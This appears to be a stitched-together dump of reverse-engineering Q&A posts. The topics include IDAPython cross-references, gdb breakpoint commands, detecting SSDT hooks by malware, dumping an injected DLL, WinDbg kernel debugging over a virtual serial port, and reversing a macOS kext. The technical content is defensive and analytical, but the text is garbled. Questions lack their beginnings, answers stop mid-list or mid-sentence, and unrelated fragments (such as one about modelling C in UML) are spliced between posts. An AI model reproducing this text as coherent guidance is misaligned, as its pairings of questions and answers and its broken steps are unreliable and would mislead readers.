<p>For this purpose I've looked into some existing tools listed below, but unfortunately I'm not sure whether I can use them to reveal information flows or not.</p>

<ul>
<li><a href=""https://github.com/Cr4sh/openreil"">OpenREIL</a>: The aim of this project is to lift up arch-dependent binaries into REIL.</li>
<li><a href=""https://github.com/programa-stic/barf-project"">Barf Project</a>: A multiplatform open source Binary Analysis and Reverse engineering Framework</li>
<li><a href=""http://www.capstone-engine.org"">Capstone</a>: A disassembly framework.</li>
<li>Epic: This tool translates binaries of any-arch to arch-independent LLVM bitcode. (This project is not public, so I cannot use it.)</li>
</ul>

<h2>Question</h2>

<p>Is there any IL out there that I use to statically analyze a arch-dependent <code>.so</code> file (within an APK archive) in order to extract information flows? Basically I want it to provide basic requirements such as slicing and PDG.</p>
","<p>My recommendation is to use libVEX, as it's the most robust intermediate code library that I know of. It's part of Valgrind and supports a load of <a href=""http://valgrind.org/info/platforms.html"" rel=""nofollow"">architectures</a>. You can either use libVEX in a C/C++ program or, alternatively, use the Python bindings called <a href=""https://github.com/angr/pyvex"" rel=""nofollow"">PyVex</a>.</p>

<p>In any case: consider that most of the things you want to do must be implemented from scratch. Everything but translation of assembly ""dialects"" to an intermediate representation, I would say. Or, perhaps, you can use some parts of the <a href=""https://github.com/angr/angr"" rel=""nofollow"">Angr Project</a>. I haven't tested it myself.</p>

"How to get cross-references to a struct type in IDA by IDAPython and add comments to variables of the struct type","1288","","<p>I'm writing an IDA plugin using idapython in order to add comments (located in database) to variables of struct types. In order to do this, firstly, i need to get the list of cross-references to a given structure type (e.g. struct BITMAPINFO) which can be found in ""Structure"" subview in IDA. </p>

<p>I know IDA provides this function from version 6.2 by right-button mouse clicking on the structure name and selecting ""List cross references to"". A window like the following will be popped-up:</p>

<p><a href=""https://i.stack.imgur.com/CBI7A.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CBI7A.png"" alt=""example: xrefs to BITMAPINFO picture""></a></p>

<p>Each item of the list in above picture is either an address where a global variable of type %structure name% (here is BITMAPINFO) is declared or a position where a local variable of type ""structure name"" is defined. The former is like</p>

<p><a href=""https://i.stack.imgur.com/KxBT2.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/KxBT2.png"" alt=""example: global variable definition of type GUID""></a>
(here is type GUID, not BITMAPINFO).</p>

<p>The latter is like
<a href=""https://i.stack.imgur.com/McC7c.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/McC7c.png"" alt=""example: local variable definition of type BITMAPINFO""></a>
This is the position where IDA declare local variables based on its identified type.</p>

<p>I wonder if there is a way to get these data by IDAPython.</p>

<p>NOTE: This is different from cross-references to a(ll) member(s) of a struct type, which can be got by right-button mouse clicking on the structure member name, shown as the following</p>

<p><a href=""https://i.stack.imgur.com/XIcJe.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/XIcJe.png"" alt=""example: XrefsTo GUID.DATA1""></a></p>

<p>Before asking here, i do it like:</p>

<pre><code>#CODE 1
ea = idc.LocByName(%structure name%)  

frm = [x.frm for x in idautils.XrefsTo(ea)]
</code></pre>

<p>I think i have got the whole list of cross-references to %structure name% using my above code. However, i found many EAs in the list seem like ineffective such as '0xff0052c9' (<b>MaxEA is 0x108f800</b>). However, i guess my code has got the desired result because the length of returned list is equal to the number of items in the list shown as the 1st picture. But i can't explain the result especially the (seemingly) ineffective ones. Also, when i add comments to the addresses in the list using the following code</p>

<pre><code>#CODE 2
for ea in xrefs_list:
    # each cross-reference to the given struc type

    if repeatable:
        # add repeatable comment 'cmt' at address 'ea'
        idc.MakeRptCmt(ea, cmt)

    else:
        # add comment  'cmt' at address 'ea'
        idc.MakeComm(ea, cmt)
</code></pre>

<p>i found i only added comments to the effective addresses which are between <b>idc.MinEA()</b> and <b>idc.MaxEA()</b>, and these addresses are places where global instances of the queried struct type are declared, as shown in the 2nd picture.</p>

<p>My questions are:</p>

<blockquote>
  <ol>
  <li>Is my above code (CODE 1) correct to get all cross-references to a struct type?
  If it is, how to explain those seemingly ineffective addresses (above 0xFF000000)</li>
  <li>How to add comments to other cross-reference addresses other than the references to global instances of the struct type? </li>
  </ol>
</blockquote>
","<h2>Stack Variable References</h2>

<p>The xrefs you are showing are xrefs from stack variables. As you mentioned, when trying to get the xrefs to the struct, you get two types of results:</p>

<ol>
<li>Valid addresses, which are struct instances in the data section</li>
<li><code>0xFF000000</code> and above addresses, where the struct is used as a stack variable.</li>
</ol>

<p>In IDA the stack variables for a function are represented internally as a struct, with each stack variable a member of that struct.</p>

<blockquote>
  <p>idaman struc_t *ida_export get_frame(const func_t *pfn);</p>
</blockquote>

<p><a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/frame_8hpp.html#a538eae24587b7931ea67d9d110d68193"" rel=""nofollow"">Docs link</a></p>

<p>Knowing that, we can infer that the weird xrefs are member-ids (which they are). To get the names of the containing structs we use <code>fullname = idaapi.get_member_fullname(mid)</code> and get something like <code>$ F4014B0.var_14</code>.
<code>$ F4014B0</code> is the netnode name of the stack-frame struct for the function at <code>0xF4014B0</code>.</p>

<pre><code>import idc
import idaapi
import idautils

sid = idc.GetStrucIdByName('my-struct-name')
for xref in idautils.XrefsTo(sid):
    if 0xFF000000 &gt; xref.frm:
        # The struct is used as data
        print 'Data xref from 0x{:X}'.format(xref.frm)
    else:
        # The struct is used as a stack variable.
        mid = xref.frm
        fullname = idaapi.get_member_fullname(mid)
        function_ea = int(fullname[2:].split('.')[0], 0x10)
        print 'Stack xref from 0x{:X}'.format(function_ea)
</code></pre>

<h2>Getting Xrefs to member Variables</h2>

<p>(This is here because it was my initial answer, and it contains valuable information.)</p>

<p>You were really close to the solution. Your code gives you the <code>sid</code>, so you only get references to the struct itself. What you need, is references to the different members, and this can be done using the <code>mid</code>. You can get it using fully-qualified member names. However, since there are many members to every struct, enumerating them is usually a better choice.</p>

<pre><code>import idc
import idautils

def get_member_ids(sid):
    offset = 0
    while offset != 0xFFFFFFFF:
        mid = idc.GetMemberId(sid, offset)
        if mid != -1:
            yield mid
        offset = idc.GetStrucNextOff(sid, offset)


def get_member_xrefs(struc_name):
    sid = idc.GetStrucIdByName(struc_name)
    for mid in get_member_ids(sid):
        for xref in idautils.XrefsTo(mid):
            yield xref.frm


# And the usage:
for xref in get_member_xrefs('my-struct-name'):
    print '0x{:X}'.format(xref)
</code></pre>

<p><strong><em>edit to answer question in comment</em></strong></p>

<h2>A Bit on Netnodes</h2>

<p>This next bit is about IDA internals, so I might be off mark here. I am basic the information on SDK docs <a href=""https://www.hex-rays.com/products/ida/support/sdkdoc/netnode_8hpp.html"" rel=""nofollow"">see here</a></p>

<p>As visible in my code, many APIs that are documented for use on effective addresses (<code>ea</code>s) also work on other IDA primitives - struct ids, member ids - without any difference.</p>

<p>Internally, objects in IDA are mapped to netnodes. Lines in IDA are mapped linearly to netnode numbers, While other objects are mapped to numbers starting at <code>0xFF000000</code>. 
While addresses and struct ids might have a different semantic meaning, they are both netnode numbers. In IDA's APIs, this means that they are treated the same way.</p>

<p>I hope this makes things clearer.</p>

<pre><code>0041D654     FF15 DC714200  CALL DWORD PTR DS:[&lt;&amp;KERNEL32.GetCommandLineA&gt;]
</code></pre>

<p>When I double click it, it shows me <code>CALL DWORD PTR DS:[4271DC]</code>
So, <code>4271DC</code> seems to point to <code>76FB496D</code>, which is, indeed:</p>

<pre><code>76FB496D &gt;-FF25 60070177    JMP DWORD PTR DS:[&lt;&amp;api-ms-win-core-processenvironment-l1-2-0.Get&gt; ;KERNELBA.GetCommandLineA
</code></pre>

<p>Well, I just stole that from the application itself.
Now I want to create a call to <code>kernel32</code> myself.
I assemble a line and enter <code>CALL DWORD PTR DS:[Kernel32.GetCommandLineA]</code>
Now it's saying:</p>

<pre><code>0041D654     FF15 6D49FB76  CALL DWORD PTR DS:[KERNEL32.GetCommandLineA]
</code></pre>

<p>Looking good!</p>

<p>Assemble the line <code>CALL DWORD PTR DS:[76FB496D]</code>. Giving this a run works fine ofcourse, but whenever I run it like this on another pc, all hell breaks loose.</p>

<p>My question is: How can I make such an pointer <code>CALL DWORD PTR DS:[4271DC]</code>, so the code runs on all pc's?</p>

<p>I can of course use <code>CALL DWORD PTR DS:[4271DC]</code> in the application to call the function <code>getcomandlineA</code> whenever I want, but I don't know the (dynamic?) pointer to, let's say, <code>kernel32.lstrcpy</code>.</p>
","<p>The address at 004271DC is resolved at the application start via the executable Imports. Those addresses are different for every executable. The address where the module and functions are loaded (here 76FB496D) is also not guaranteed to always stay the same so you shouldn't hardcode them.  </p>

<p>A generic method to call a function in any executable is to dynamically import it with LoadLibrary and GetProcAddress as described here : <a href=""https://stackoverflow.com/questions/8696653/dynamically-load-a-function-from-a-dll"">https://stackoverflow.com/questions/8696653/dynamically-load-a-function-from-a-dll</a></p>

<p>then evaluated few ide and found EA most fitting also IBM RSA has good support for modelling C programs. </p>

<p>However what you will need to do is, formulate a way of modelling C programs in UML and then follow it, this is because C not being an Object Oriented language and UML being inherently Object oriented we need to device how we will represent a C construct in UML.</p>

"Finding function name of caller function","1277","","<p>Function ""Bob"" calls function ""Janice"". Currently, I'm at an address in function ""Janice"" and can easily do idc.GetFunctionName(ea) to get the name Janice. However, I also want to get the caller function Bob's name. How would I go about doing this efficiently considering I'm currently within function Janice? Thanks.</p>
","<p>Generally speaking this question as it asked is a bit ambiguous.
The answer can be divided by 2 general parts, getting a caller in the debug session and determining the potential caller list during static analysis.</p>

<p><strong>Getting a potential caller list during static analysis</strong></p>

<p>As @blabb wrote in most cases it is possible and can be done with IDA scripting capabilities.</p>

<p>Here is IDAPython example which will print all references to the callee (which is equivalent to press <kbd>x</kbd> on the callee name in IDA) assuming that your cursor is within the ""Janice"" function:</p>

<pre><code>    import idautils
    import idc
    print ""Code references""
    for ref in idautils.CodeRefsTo(idc.GetFunctionAttr(idc.ScreenEA(), idc.FUNCATTR_START), 1):
           print ref
    print ""Data references""
    for ref in idautils.DataRefsTo(idc.GetFunctionAttr(idc.ScreenEA(), idc.FUNCATTR_START)):
           print ref
</code></pre>

<p>Of course demangling should be applied to get a more human-readable name as @blabb wrote if needed.</p>

<p>It should be taken in account that this script (exactly as the pressing <kbd>x</kbd> on the callee) does not solve the indirect call issue, but shows all references to the function which may help to trace the indirect call.</p>

<p><strong>Getting a specific caller during a debug session</strong></p>

<p>This is a bit trickier and much more architecture dependent (for example in ARM you have LR register with return address which will help you in most cases if you stopped at the start of ""Janice"" function and it is not contaminated yet), you'll need to</p>

<ul>
<li>Stop in the ""Janice"" function on the breakpoint</li>
<li>Determine the placement of return address</li>
<li>Conclude the specific caller from it</li>
</ul>

<p>The script which will do it is a bit more complex and unfortunately I have no time to debug it for now, 
so I'll just list the IDAPython APIs which will probably help you to solve the problem:</p>

<pre><code>idaapi.get_func(ea) # get the function object of func_t type
idaapi.get_frame(pfn) #gets the function frame structure of struc_t type
idaapi.frame_off_retaddr(pfn) # AFAIK gets the offset of return address of the structure

<p>Question : How can I rebuild the exe file using the new edited <code>.pyc</code> files ?</p>

","<p>Instead of trying to rebuild the EXE from the <code>.pyc</code> files, you can just use py2exe to build a new EXE from the modified <code>.py</code> files.</p>

<p>Alternatively, if you really want to <em>replace</em> the library in the original EXE, you would need to extract the EXE's <code>PYTHONSCRIPT</code> resource with a resource editor, un-marshal the array of code objects, replace the code object of your choosing in the array, re-marshal the array of code objects, and replace the <code>PYTHONSCRIPT</code> resource data with this new marshaled stream.

"Run command on breakpoint without stopping","1263","","<p>I'd like to automate the following in my <code>.gdbinit</code>:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes

# When execution stops at the above breakpoint,
# I want to display the contents of `rcx` as a string:
x/s $rcx
c  # do not stop here
</code></pre>

<p>How do I automate this?</p>

<h3>UPDATE: Here's a better <code>.gdbinit</code> example:</h3>

<pre><code># Our custom-built libcurl, with debugging symbols enabled:
set environment LD_PRELOAD=./curl/curl-7.34.0/lib/.libs/libcurl.so

# File that connects to the evil server:
file ./evil

# Make sure we get notified when it connects!
break curl_easy_setopt
commands $bpnum
clear curl_easy_setopt  # to avoid recursion
call curl_easy_setopt(curl, CURLOPT_VERBOSE)
continue
end
</code></pre>

<p>This hooks in to the evil binary, and when it initialises its curl handle, we set set it to verbose so we get lots of output about what's going on.</p>

<p>Thanks for the answer.</p>
","<p>Easy enough. In your case what you most likely want is <a href=""http://www.sourceware.org/gdb/onlinedocs/gdb.html#Break-Commands"" rel=""nofollow noreferrer""><code>commands</code></a> which can be used to create ""routines"" that run whenever a breakpoint is hit. For your case roughly:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes
commands 1
x/s $rcx
continue
end
</code></pre>

<p>Problem is that you need to hardcode the breakpoint number. Depending on the GDB version you may get around this using the <code>$bpnum</code> convenience variable. So:</p>

<pre><code>break boost::uuids::detail::sha1::process_bytes
commands $bpnum
x/s $rcx
continue
end
</code></pre>

<p>Also see <a href=""https://stackoverflow.com/a/11019683/476371"">this</a> concerning the last example.</p>

<p><strong>Note:</strong> using this method can be quite taxing on the CPU depending on how often this gets called and whether a hardware breakpoint could be used by GDB.</p>

<hr>

<p>You can also use the conditional form of breakpoints. Check out the actual authoritative reference <a href=""http://www.sourceware.org/gdb/onlinedocs/gdb.html#Set-Breaks"" rel=""nofollow noreferrer"">here</a>. The form looks like this:</p>

<pre><code>break ... if cond
</code></pre>

<p>You can also set the condition independent of setting the breakpoint, if you know the breakpoint number. Use <code>info break</code> to get the number of the breakpoint and then use that as <code>bnum</code> in:</p>

<pre><code>condition bnum expression

<p>The erroneous address display is a result of the simplistic way in which IDA manages things internally. Basically, everything contained in a struct or array belongs to its starting address ('head'), and if the display is continued over multiple lines then IDA simply reprints the starting address instead of the correct address. It's a bit annoying but that's the way IDA works.</p>

<p>P.S.: perhaps it would be worth it to file a defect report or post in IDA's bug forum; after all, the displayed addresses are definitely wrong. I wouldn't hold my breath but who knows...</p>

"Is there an easy way to detect if the SSDT has been patched from a memory dump?","1220","","<p>The <a href=""http://en.wikipedia.org/wiki/System_Service_Dispatch_Table"">SSDT</a> is a dispatch table inside the Windows NT kernel, and it is used for handling calls to various internal kernel APIs. Often malware will change addresses in the SSDT in order to hook certain kernel functions. Spotting this kind of thing in a memory dump would be awesome, because it would allow me to identify potential rootkits. Is there a way to reliably detect them? What kind of memory dump is required?</p>
","<p>No <em>absolutely reliable</em> way, no.</p>

<p>Either way you'll need a full dump, but the problem is that malware could even hook the responsible functions inside the kernel and modify <em>what</em> gets dumped. There are several things that have to be considered here.</p>

<p>You <em>can</em> detect it if the malware used a trivial method for hooking in the first place. Let's assume the address was replaced by one to a trampoline or to inside another loaded image (or even outside one just in nonpaged pool), then you can <em>easily detect</em> it. You can simply enumerate all the modules and attempt to find the one inside which the address from inside the SSDT points. In case of a trampoline you'll have to disassemble the instructions there to see where it jumps/calls. There are plenty of libraries out there for the purpose, such as <a href=""http://udis86.sourceforge.net/""><code>udis86</code></a>.</p>

<p>However, if a malware is sneaky, it could use the natural gaps inside an executable (such as the kernel) when loaded into memory. As you probably know, the way a PE file (such as <code>ntoskrnl.exe</code> and friends) is represented differently on disk and in memory. The on-disk file format is more terse. Loaded into memory, the sections are aligned in a particular way described in the PE header. This way gaps will likely exist between the real size of a section (end) and the properly aligned section size (""padding""). This leaves place to <em>hide</em> something like a trampoline or even more shell code than a simple trampoline. So a naive check such as the above - i.e. enumerating modules and checking whether the SSDT functions point inside the kernel image - will not work. It would get bypassed by malware sophisticated enough to do what I just described.</p>

<p>As you can imagine, this means that things - as all things malware/anti-malware - quickly becomes an arms race. What I would strongly suggest is that you attach a kernel debugger (<code>WinDbg</code> via Firewire comes to mind) and keep the infected (or allegedly infected) machine in limbo while you investigate. While you are connected and broke into the debugger, the debuggee can't do anything. This can be used to debug a system live and - assuming the malware wasn't sneaky enough to also manipulate <code>kdcom</code> - to gain valuable metrics - it can also be used to create a crashdump directly (see WinDbg help). If you have conclusive evidence that a machine is infected, due to symptoms it exhibits, odds are the malware isn't all too sophisticated and you will not have to care about the special case I outlined. However, keep in mind that this special case can only be considered <em>one</em> out of many conceivable cases used to hide. So long story short: there is no <em>absolutely reliable</em> way to do what you want.</p>

<p>It has sometimes been said - and it's true - that the attacker just needs to find one out of an infinite number of attack vectors, whereas the defender can only defend a finite number of <em>known</em> attack vectors. The lesson from this should be that we - as anti-malware industry (in which I work) - can always claim that <em>we</em> didn't find anything on the system, but that it is wrong to claim that the system is clean.</p>

<hr>

<p>Side-note: I have also read, but never seen it in a kernel debugging session myself or in any kind of FLOSS implementation, that some method tries to re-load the kernel from the image on disk and run it through the early initialization steps, thereby creating a ""shadow"" SSDT. This one would then be pristine and could be used to ""unhook"" everything in one fell swoop from the original SSDT. Again, haven't seen this implemented, but from my knowledge of the internals it seems a possibility. Of course this plays more with the idea of detecting/unhooking a rootkit's functions than it does with your original intention of getting a memory dump of an infected system.</p>

"how can the processor instruction set be identified solely by examining a binary image?","1216","","<h1>Constraints:</h1>

<p>I am doing reverse engineering of a binary firmware image of unknown provenance, which operates on a device that is <strong>not</strong> physically accessible to me.  That is, I can't take apart the device, don't have even block diagrams for its function, and have no ability to identify the microprocessor by visual inspection or by asking the creator of the object.  Literally the <em>only</em> thing available is the binary image.</p>

<p>My question is: <strong>given those constraints</strong> what tools or theoretical approaches could be employed to identify the processor's instruction set by examining the binary?  </p>

<h1>Research so far:</h1>

<p>I have, of course, attempted to use disassemblers for various popular ISAs such as ARM, x86 and MIPS.  I have also done a literature search for research papers but haven't turned up anything at all.</p>

<p>Ideally, what I'd like is a tool that would examine the binary and then report something like ""75% probability that this is code for a Renesas M16C."" </p>
","<p>This is extremely hard to perform. Given no initial information, you'll have to go through it heuristically using pattern matching &amp; probabilistic approximations.</p>

<p>I've been working for two years on such a tool (I have written tons of helpful tools destined to be used by myself for work &amp; which I plan to share someday, not soon though). It works, but it's not mature enough to be thrown in the jungle. My approach is as follows : detect binary format data structures if possible, disassemble a chunk of binary code by using multiple instruction set encoding (ARM, x86, MIPS, ...) and then heuristically assess (using bads &amp; some other stuff :]) which is closer ...    </p>

<p>But interestingly, your question has been asked <a href=""https://reverseengineering.stackexchange.com/questions/2897/tool-or-data-for-analysis-of-binary-code-to-detect-cpu-architecture"">here</a> before and an interesting approach was given and considered an answer.

Research efforts like <a href=""http://bitblaze.cs.berkeley.edu/"" rel=""nofollow"">BitBlaze</a> and <a href=""http://dslab.epfl.ch/proj/s2e"" rel=""nofollow"">S2E</a> have used modified versions of Qemu to trace kernel mode components for bug finding. </p>

<p>The key difference, I think, is that Qemu/Bochs as whole system emulators do not present a by default view of the program under inspection as a DBI does. A DBI allows for dynamic editing of the program by default. Emulators have the primitives required to effect DBI, they can read and write memory and by extension program code, but they do not provide the API that PIN does for program modification.</p>

<p><strong>The layout:</strong> GNU/Linux host with Arch Linux distribution (even though the distro does not play a crucial role in this scenario), with VMWare Workstation 11 installed, hosting two MS Windows virtual machines - MS Windows 7SP1 x64 (the DEBUGGER), and MS Windows 8.0 x64 (the DEBUGGEE).</p>

<p><strong>The solution:</strong> I did quite a lot of Googling to figure this out, and there was some information here and there, but I was no able to find a solution that would work for my case.
Therefore, I have compiled my findings and a working step-by-step approach in the solution written below. Hopefully this will be also useful for someone else as well.</p>
","<p>This is a step-by-step approach, excluding the actual host system installation, VMware setup and Virtual Machine creation, since these are rudimentary steps and anyone willing to perform kernel debugging should be capable doing.
The approach is split into three parts - the VM hardware settings, MS Windows configuration, and establishing a debugging session.</p>

<h2>I. VM hardware settings</h2>

<ol>
<li><p>Start with the DEBUGGER VM (the one from where you will be connecting to the DEBUGGEE to perform kernel debugging). In virtual machine settings hardware tab click 'Add...' to add new 'Serial port' device. </p>

<li><p>Give the name to the Socket (named pipe) a one you desire in a writeable location. I chose a '/tmp' folder and give the name 'com1', so that the full path of the socket is '/tmp/com1'. Since the DEBUGGER will connect to a DEBUGGEE specify the direction of connection as 'From: Client' and 'To: A Virtual Machine'. Also, make sure the device status is selected as 'Connect at power on' unless you require otherwise.</p>

<li><p>Configure the DEBUGGEE VM (the one which will be debugged). In virtual machine settings hardware tab click 'Add...' to add new 'Serial port' device.Set Serial port type to 'Output to socket'. Give the name to the Socket exactly the same one as you set it for the DEBUGGER, in this case - '/tmp/com1'. Specify the direction of connection as 'From: Server' and 'To: A Virtual Machine'. Check that device status is selected as 'Connect at power on' unless you require otherwise.</p>

<li><p>For the I/O mode make sure that 'Yield CPU on poll' is checked. Once done, this will prepare your VM to use the serial connection, and both VMs should be able to communicate over that.

<h2>II. MS Windows configuration</h2>

<h2>III. Establishing a debugging session</h2>

<ol start=""9"">
<li><p>Start the DEBUGGER VM. Download and install the MS Windows SDK with debugging tools. The Microsoft Windows SDK for Windows 7 can be found <a href=""https://www.microsoft.com/en-us/download/details.aspx?id=3138"" rel=""nofollow noreferrer"">here</a>. Run the WinDbg and choose 'File/Kernel Debug (Ctrl+K)' to configure a debugging session over serial connection. In kernel Debugging settings COM tab, set baud rate to 115200 and port - com1 (or the name you specified). Once you click OK, the WinDbg will start waiting on com1 for incoming debugging sessions.</p>

<p><a href=""https://i.stack.imgur.com/8HLQw.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/8HLQw.png"" alt=""WinDbg Setup""></a></p></li>
<li><p>Start the DEBUGGEE VM. Make sure you choose the ""Windows 8 Debugging"" boot option to start the machine in the debugging mode.</p></li>
<li><p>On your DEBUGGER VM in WinDbg you should see an incoming kernel debugging connection. Select 'Debug/Break (Ctrl+Break)' to issue an interrupt and start debugging the kernel.</p>

<p><a href=""https://i.stack.imgur.com/dp0VN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/dp0VN.png"" alt=""Kernel debugging connection""></a></p></li>
</ol>

<p>These steps should be enough to get the Kernel Debugging session over serial connection between two MS Windows VMs on a GNU/Linux host up and running.</p>

"Extracting files from .data and .toc files","1201","","<ul>
<li><a href=""https://mega.co.nz/#!0MJgGAAL!ArUvamiuumle0uR0HJNDWjebI3g_R12iBLVq-geuZFE"" rel=""nofollow"">core.toc</a> [87 KB]</li>

</ul>

<p>the <code>.toc</code> is a table of contents files that always starts with the header 1rrs.
It also contains directory and file paths at offsets that will relate to the data file.</p>

<p>Where should I start trying to use the <code>.toc</code> to extract from the <code>.data</code> file?</p>
","<p>Full Disclosure is always appreciated. This seems to be a (""the""?) data file for FASA Studio's ""Shadowrun"". Anyway, the data file contains enough recognizable items to get a good start (PNGs, Unicode text). Data seems to be aligned on 16 bytes, padded with what seems to be random trash.</p>

<p>PNG images are a good start; you can extract them 'manually' (I used <a href=""http://www.suavetech.com/0xed/"" rel=""nofollow noreferrer"">0xED</a>) and see if they are well-formed. The few I tried were, and the all-but-one last data block should be a PNG image, according to the toc file. I located it at <code>0x82A72D0</code>, with a length of <code>0x2E231</code> bytes.</p>

<p><img src=""https://i.stack.imgur.com/WDvNG.png"" alt=""the very last PNG in core.data""></p>

<p>Then I checked the data around the last PNG file <em>name</em> in <code>core.toc</code> for these bytes. Bingo - not a huge challenge.</p>

<p>The initial part of the toc file is unknown but may be a fast look-up table. I didn't cross-reference this any further with what follows. After that, the following data can be found per each file:</p>

<pre><code>4 bytes   length (little endian)
4 bytes   offset
8 bytes   unknown (perhaps checksum, perhaps file data/time, who knows?)
3 bytes   name length -- possibly only the first 2 though, 3 bytes is rare #
x bytes   name
</code></pre>

<p>Right after the block of file names more stuff appears, I couldn't think of a use for it. You could extract all file names, count them, and see if this is relevant. It seems it isn't as the file name block contains everything you were looking for.</p>

<h2>Edit:</h2>

<p># Ah-- for the first file, this <code>name length</code> is <code>0x0E 0x00 0x01</code>. Seems the third byte indicates something else, then. I found 2 so far with a <code>0x01</code>, both are '<em>pathless</em>' files.</p>

"How to cause program to stop execution when a particular value is found in memory","1201","","<p>I am new to reverse engineering. This is my problem:
I am running a program and I know a value '<strong>X</strong>' will be calculated during execution.
Now how do i set the IDA or ollydbg to break when value X appears for the first time in the memory. (I guess it is similar to Memory/Data Breakpoints)
Please help.</p>
","<p>Well, I was tying few weeks ago to implement an ollyscript which triggers conditional beakpoints on each line where a desired alpha/numerical value is found.</p>

<p>This program gives the user the choice of following one of 3 methods:</p>

<p>1- Trace methode (which works with numbers)</p>

<p>2- Memory breakpoints </p>

<p>3- Smart research by setting unconditional breakpoints (works by two passes)</p>

"How to dump a DLL not listed using Process Explore and similar tools","1199","","<p>I am trying to reverse engineer a DLL that may contain malware. One thing I noticed is that it hides itself from the DLL <code>LDR_MODULE</code> list. So, when I use Ollydbg or smiler tools I do not see it and cannot dump it. </p>

<p>I don't have the DLL file. I just have an executable file that injects the DLL into a certain process.</p>
","<p>I'll list some ways to do it. Obviously there are many others and most likely other fellows here will add. Start with those as they are ones of the mostly used.</p>

<ol>
<li>While debugging a malicious process, BP on <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms681674%28v=vs.85%29.aspx"" rel=""nofollow"">WriteProcessMemory</a>/NtMapViewOfSection API. Those are used to copy/map potential DLL into the remote process. Before the copying or mapping is done, you can dump the buffer to disk. Check the manual of the above APIs to find the local buffer which will be copied to remote process.</li>
<li>Alternatively, if you have s little understanding what malicious code is doing you can follow it by inspecting the log of <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896645.aspx"" rel=""nofollow"">procmon</a>. Once you see something in the log that is 100% done by the mal-DLL, you can open that log line and inspect the stack. The stack will tell you at what page the mal-DLL resides. If you know at what memory page the DLL resides in the infected process, you can use for example <a href=""http://processhacker.sourceforge.net/"" rel=""nofollow"">Process Hacker</a> for dumping this specific memory page by clicking on the process and inspecting memory tab.</li>
<li>Alternatively, you can dump the whole memory of the infected machine and use tool - <a href=""https://code.google.com/p/volatility/"" rel=""nofollow"">Volatility</a> to inspect the memory of a specific process or all the processes.</li>

"What are some methods to reversing a .kext?","1197","","<p>I recently discovered there is no native Linux driver for the Web Cam in my computer.  However, there is a person who has taking the initiative to start a <a href=""https://github.com/patjak/bcwc_pcie"" rel=""nofollow"">github project</a> for a driver.  That being said, I was able to get the web cam working in a qemu guest OS running OS X (10.10), and now I'm at the point where I would like to start to analyze the .kext is question.</p>

<p>A quick google search revealed <a href=""https://inficererk.wordpress.com/2014/01/30/debugging-kext-with-vmware-gdb-osx-10-8-4/"" rel=""nofollow"">this</a>, but I am not sure if this method would still apply to OS X (10.10).</p>

<p>Should I try to debug the .kext on a running system, or should I just copy the .kext to my host OS (Linux) and start analyzing in a disassembler such as Hopper / Radare2?</p>

<p>Also I should note, from what I understand, most OS X kernel extensions are written in C++ while most if not all Linux drivers are written in C.  So would I be wasting my time reversing / analyzing this .kext?  Any help on this subject matter would be greatly appreciated.</p>
","<p><strong>Answering Your Question Directly</strong>: </p>

<p>You can reverse Kernal Extensions with IDA Pro, Radare2, GDB or whatever dissasembler you would like. Yes, you will have to learn what C++ structures look like once disassembled. I can't answer the ""static analysis or dynamic analysis?"" question directly, since often the answer is ""both, depending on exactly what you want."" Some Reverse Engineers start with the static, and some start with the dynamic. </p>

<p>I <em>personally</em> would start with a static analysis tool because: </p>

<ul>
<li>I imagine the driver is rather large. If you don't know what you are looking for, you could spend a long, long time single stepping. </li>
<li>You will get more out of this by searching over and analyzing specific function calls in the driver. Their use will most likely be self evident in the driver once you see their relation to other functions</li>
<li>There isn't an element of obfuscation here. Nor do you need to check the <em>exact</em> position of anything in memory. </li>
<li>You are trying to rewrite a driver from this anyway, seeing things in a format that resembles source code will help that process. </li>
</ul>

<p>But to each his own. Given enough time I would go through both processes just for the sake of knowing. Also, to pull this off correctly, you will need to learn a little about Macintosh system programming. </p>

<p>There is a class at recon on this subject this year: <a href=""http://www.recon.cx/2015/trainingosx.html"" rel=""noreferrer"">http://www.recon.cx/2015/trainingosx.html</a> (once the white paper is published, it should be linked in this answer) </p>

<p>Here is a snippet from a book on kernal exploitation that takes you through the basics of reversing a kext with IDA pro: </p>

<p><strong>Regarding this particular camera:</strong> </p>

<p>It seems that the camera in question is referenced in the conversation found here: <a href=""https://bugzilla.kernel.org/show_bug.cgi?id=71131"" rel=""noreferrer"">https://bugzilla.kernel.org/show_bug.cgi?id=71131</a></p>

<p>Essentially, this camera speaks over <em>PCI</em> because it does not compress its video before being sent to the system. The thread states that there is already a project underway to make a driver for the camera, which can be found at <a href=""https://github.com/patjak/bcwc_pcie"" rel=""noreferrer"">https://github.com/patjak/bcwc_pcie</a></p>

<p>The wiki on this site is informative, and lists some of the issues with reverse engineering this sort of driver. The wiki page found at: <a href=""https://github.com/patjak/bcwc_pcie/wiki/Mac-OS-X-driver"" rel=""noreferrer"">https://github.com/patjak/bcwc_pcie/wiki/Mac-OS-X-driver</a> gives some great ideas for where you should be starting on the mac side of things. </p>

<p>Based on their to do list, you might want to focus on helping rip the device firmware from the device itself. </p>

<p><strong>Regarding developing your own driver:</strong> </p>

<p>I would start from a different direction, and reverse engineer the camera itself. Depending on the complexity of your camera, you may be able to speak to it directly without a driver over serial. You might also be able to open up the camera, and speak to it directly via a debug port (think JTAG, or even simpler.) </p>

<p>The first time I read your question, I thought you meant a small camera outside your computer, but I am guessing you mean a camera built into your laptop. I think in that case, you could just adapt a driver from an existing webcam, and see where it dies. I believe these cameras are fairly generic bits of hardware at this point. </p>

<p>Most webcam's on Linux use this driver: <a href=""https://help.ubuntu.com/community/UVC"" rel=""noreferrer"">https://help.ubuntu.com/community/UVC</a>, and potentially you can just run this driver and see where it dies/can't communicate with the camera. At any rate, watching the actual communications with the camera will give you a much better idea of what you need to do. </p>

<p><strong>Regarding the Utility of reversing a Macintosh Kernal extension:</strong></p>

